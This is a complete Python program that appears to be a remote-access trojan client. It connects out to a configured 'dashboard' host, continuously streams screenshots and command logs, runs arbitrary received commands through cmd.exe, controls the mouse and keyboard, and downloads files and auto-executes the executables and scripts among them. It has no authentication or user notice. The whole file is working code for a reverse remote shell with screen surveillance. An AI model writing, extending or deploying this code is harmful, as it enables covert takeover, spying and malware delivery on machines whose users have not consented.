import threading
import pyautogui
from PIL import Image, ImageDraw
import io
import socket
import struct
import subprocess
import os
import time
import base64

# ---------------- CONFIG ----------------
DASHBOARD_IP = "192.168.1.10"  # Replace with your dashboard IP
DASHBOARD_PORT = 5000
MIN_RECONNECT = 1
MAX_RECONNECT = 30

CURRENT_DIR = os.getcwd()
TERMINAL_LOG = []
log_lock = threading.Lock()
dir_lock = threading.Lock()
SHUTDOWN_FLAG = threading.Event()
client_socket = None

# ---------------- LOGGING ----------------
def append_log(text):
    with log_lock:
        TERMINAL_LOG.append(text)
        if len(TERMINAL_LOG) > 300:
            TERMINAL_LOG[:] = TERMINAL_LOG[-300:]

def get_logs_bytes():
    with log_lock:
        return "\n".join(TERMINAL_LOG).encode("utf-8")

# ---------------- EXECUTE COMMAND ----------------
def execute_command(cmd):
    global CURRENT_DIR
    cmd = cmd.strip()
    if not cmd:
        return

    # Shutdown
    if cmd == "__shutdown__":
        append_log("[System] Shutting down per dashboard request")
        SHUTDOWN_FLAG.set()
        return

    # Mouse click
    if cmd.startswith("__click__"):
        try:
            parts = cmd.split()
            x, y = int(parts[1]), int(parts[2])
            button = parts[3] if len(parts) > 3 else "left"
            pyautogui.click(x, y, button=button)
            append_log(f"[Click] {button} click at ({x},{y})")
        except Exception as e:
            append_log(f"[Click Error] {e}")
        return

    # Keyboard
    if cmd.startswith("__key__"):
        try:
            char = cmd[len("__key__ "):]
            pyautogui.typewrite(char)
            append_log(f"[Type] Sent char: {char}")
        except Exception as e:
            append_log(f"[Type Error] {e}")
        return

    special_keys = {
        "__key_backspace__": "backspace",
        "__key_enter__": "enter",
        "__key_tab__": "tab"
    }
    if cmd in special_keys:
        try:
            pyautogui.press(special_keys[cmd])
            append_log(f"[Type] Pressed key: {special_keys[cmd]}")
        except Exception as e:
            append_log(f"[Type Error] {e}")
        return

    # File receive
    if cmd.startswith("__sendfile__"):
        threading.Thread(target=handle_sendfile, args=(cmd,), daemon=True).start()
        return

    # Change directory
    if cmd.lower().startswith("cd "):
        path = cmd[3:].strip()
        path_expanded = os.path.expandvars(os.path.expanduser(path))
        with dir_lock:
            if not os.path.isabs(path_expanded):
                path_expanded = os.path.join(CURRENT_DIR, path_expanded)
            if os.path.isdir(path_expanded):
                CURRENT_DIR = os.path.normpath(path_expanded)
                append_log(f"[CD] Changed directory to: {CURRENT_DIR}")
            else:
                append_log(f"[CD] Directory not found: {path_expanded}")
        return

    # Shell commands
    def run_cmd():
        try:
            with dir_lock:
                cwd = CURRENT_DIR
            proc = subprocess.Popen(["cmd.exe", "/c", cmd],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    text=True, cwd=cwd)
            stdout, stderr = proc.communicate(timeout=15)
            output = (stdout or "") + (stderr or "")
            append_log(output.strip() if output.strip() else "(No output)")
        except subprocess.TimeoutExpired:
            proc.kill()
            append_log(f"(Command timed out: {cmd})")
        except Exception as e:
            append_log(f"(Execution error: {e})")

    threading.Thread(target=run_cmd, daemon=True).start()

# ---------------- FILE HANDLER ----------------
def handle_sendfile(cmd):
    global client_socket
    try:
        parts = cmd.split()
        filename_b64 = parts[1]
        filesize = int(parts[2])
        filename = base64.b64decode(filename_b64.encode()).decode()
        append_log(f"[SendFile] Receiving {filename} ({filesize} bytes)")

        def recv_exact(sock, size):
            data = b""
            while len(data) < size:
                chunk = sock.recv(size - len(data))
                if not chunk:
                    return None
                data += chunk
            return data

        file_data = recv_exact(client_socket, filesize)
        if file_data is None:
            append_log("[SendFile Error] Lost connection during file receive.")
            return

        filepath = os.path.join(CURRENT_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(file_data)

        # Execute files safely
        ext = os.path.splitext(filename)[1].lower()
        try:
            if ext in [".bat", ".cmd", ".exe", ".py"]:
                subprocess.Popen([filepath], cwd=CURRENT_DIR)
            elif ext in [".mp3", ".wav", ".ogg"]:
                os.startfile(filepath)  # Play audio using default media player
            else:
                os.startfile(filepath)  # Open other files with default program
            append_log(f"[SendFile] Opened {filename}")
        except Exception as e:
            append_log(f"[SendFile Error] {e}")

    except Exception as e:
        append_log(f"[SendFile Error] {e}")

# ---------------- SCREEN CAPTURE ----------------
def capture_screen_bytes():
    img = pyautogui.screenshot()
    x, y = pyautogui.position()
    frame = img.copy()
    draw = ImageDraw.Draw(frame)
    draw.ellipse((x-8, y-8, x+8, y+8), fill=(0,255,0))
    buf = io.BytesIO()
    frame.save(buf, format="JPEG", quality=70)
    return buf.getvalue()

# ---------------- NETWORK ----------------
def connect_to_dashboard():
    global client_socket
    backoff = MIN_RECONNECT
    while not SHUTDOWN_FLAG.is_set():
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((DASHBOARD_IP, DASHBOARD_PORT))
            append_log("[System] Connected to dashboard")
            backoff = MIN_RECONNECT

            # Send loop: screen + logs
            def send_loop():
                while not SHUTDOWN_FLAG.is_set():
                    try:
                        frame_bytes = capture_screen_bytes()
                        client_socket.sendall(struct.pack("!I", len(frame_bytes)) + frame_bytes)
                        logs = get_logs_bytes()
                        client_socket.sendall(struct.pack("!I", len(logs)) + logs)
                        time.sleep(0.05)
                    except:
                        break

            threading.Thread(target=send_loop, daemon=True).start()

            # Receive commands
            while not SHUTDOWN_FLAG.is_set():
                raw_len = client_socket.recv(4)
                if not raw_len:
                    break
                cmd_len = struct.unpack("!I", raw_len)[0]
                cmd_bytes = b""
                while len(cmd_bytes) < cmd_len:
                    chunk = client_socket.recv(cmd_len - len(cmd_bytes))
                    if not chunk:
                        break
                    cmd_bytes += chunk
                if not cmd_bytes:
                    break

                cmd_str = cmd_bytes.decode("utf-8")
                execute_command(cmd_str)

        except Exception as e:
            append_log(f"[!] Connection failed: {e}")
            time.sleep(backoff)
            backoff = min(backoff*2, MAX_RECONNECT)
        finally:
            try:
                client_socket.close()
            except:
                pass

if __name__ == "__main__":
    connect_to_dashboard()
